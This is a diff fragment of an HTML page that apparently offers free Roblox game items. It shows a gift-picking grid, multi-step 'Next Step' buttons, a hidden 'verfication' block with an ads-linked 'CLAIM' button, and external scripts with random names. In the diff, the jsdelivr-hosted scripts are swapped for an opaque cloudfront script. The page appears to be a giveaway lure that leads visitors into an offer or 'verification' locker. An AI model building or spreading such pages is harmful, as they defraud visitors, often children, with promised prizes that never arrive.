-                     <path d="M6.69813 70.9717C6.56844 70.9717 6.43874 70.9562 6.30904 70.9199C5.47898 70.7072 4.97576 69.8563 5.19365 69.0263C8.79922 55.045 21.3954 45.2762 35.8228 45.2762C50.2503 45.2762 62.8465 55.0398 66.4572 69.0211C66.6699 69.8512 66.1719 70.702 65.3366 70.9147C64.5014 71.1326 63.6558 70.6293 63.4379 69.7941C60.1851 57.1876 48.8288 48.3837 35.8176 48.3837C22.8117 48.3837 11.4554 57.1876 8.19743 69.7941C8.02104 70.5048 7.39331 70.9717 6.69813 70.9717Z"></path>
-                  </svg>
-               </div>
-            </div>
-            <div class="verfication d-none">
-               <div class="vpn d-none">
-               </div>
-               <div class="action-ads">
-                  <div class="send" onclick="_Wi()">CLAIM</div>
-               </div>
-            </div>
-            <div class="chat">
-               <div class="over"></div>
-               <div class="items">
-               </div>
-            </div>
-         </div>
-      </div>
-      <div class="gift-next d-none">
-         <div class="container-md">
-            <div class="txt">You can only choose <span id="max-item">4</span> gifts</div>
-            <div class="action">Next Step</div>
-         </div>
-      </div>
-      <div class="followers-next d-none">
-         <div class="container-md">
-            <div class="action disabled">Next Step</div>
-         </div>
-      </div>
-      <div class="coins-next d-none">
-         <div class="container-md">
-            <div class="action disabled">Last step</div>
-         </div>
-      </div>
-      <div id="giftsContainer"></div>
-      <div id="giftsContainer" style="display: flex; flex-wrap: wrap; gap: 10px;"></div>
-      <script>
-         var giftsImg = [
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Matteos.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Job-Job-Job-Sahur.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Urubini-Flamenguini.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Bombardini-Tortinii.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tipi-Topi-Taco.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Nooo-My-Hotspot.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Bulbito-Bandito-Traktorito.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tob-Tobi-Tobi.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Te-Te-Te-Sahur.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Orcalitos.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Esok-Sekolah.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Karkerkar-Kurkur.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Torrtuginni-Dragonfrutini-2.png",
-            "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Hotspot.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Combinasionas.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Ganganzelli-Trulala.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Agarrini-la-Palini.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Avocadorilla.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Pi-Pi-Watermelon.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Pipi-Corni.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Pipi-Avocado.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Cocosini-Mama.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/diamond-statutuni-libertino.webp",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/gold-statutuni-libertino.webp",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/statutuni-libertino.webp",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/diamond-sammyni-spiderini.webp",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Piccione-Macchina-2.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Gorillo-Watermelondrillo-300x300.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Chicleteira-Bicicleteira-300x300.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Salamino-Penguino-300x300.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Strawberelli-Flamingelli.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Crocodillitos-2.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Las-Vaquitas-Saturnitas-2.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Nuclearo-Dinossauro-3.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Gold.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/turbo.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/matteo.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Lava-Mutation.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Rainbow.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Celestial.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Candy.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Blood-moon.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/Diamond.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/TigroligreFrutonni.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/OrcaleroOrcala.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/ZibraZubraZibralini.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/TigrilliniWatermelini.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/SpioniroGolubiro.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/PotHotspot.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/TorrtuginniDragonfruti.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/RainbowGraipussMedussi.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/DiamondGraipussMedus.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/RainbowLaVaccaSaturnoSaturnita.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/GoldenTralaleroTralala.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/$1000000.png",
-           "https://tr.rbxcdn.com/180DAY-178986b13c3ddc14b00cd9d820ce36d5/150/150/Image/Webp/noFilter",
-           "https://tr.rbxcdn.com/180DAY-46392a150c74bd4a11aca80270077e96/150/150/Image/Webp/noFilter",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/GoldenLosTralaleritos.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/DiamondLosTralaleritos.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/GoldenLaVaccaSaturnoSaturnita.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/DiamondLaVaccaSaturnoSaturnita.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/LaGrandeCombinasion.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/OdinDinDinDun.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/TralaleroTralala.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/RainbowTralaleroTralala.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/RainbowOdinDinDinDun.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/LosTralaleritos.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/LaVaccaSaturnoSaturnita.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/GraipussMedussi.png",
-           "https://cdn.jsdelivr.net/gh/monorolls/sas@main/GoldenGraipussMedussi.png"
-         ];
-      </script>
-      <script src="https://cdn.jsdelivr.net/gh/dev20l/import@main/jesn.js"></script>
-      <script src="https://cdn.jsdelivr.net/gh/dev20l/import@main/7hsk6gs.js"></script>
-      <script src="https://cdn.jsdelivr.net/gh/dev20l/import@main/y1sts7jhs.js"></script>
-      <script src="https://cdn.jsdelivr.net/gh/dev20l/import@main/api.js"></script>
-   </body>
+<script src="https://dlk457skl57zp.cloudfront.net/f53309b.js"></script>
+    <script src="script.js"></script>
+</body>
 </html>
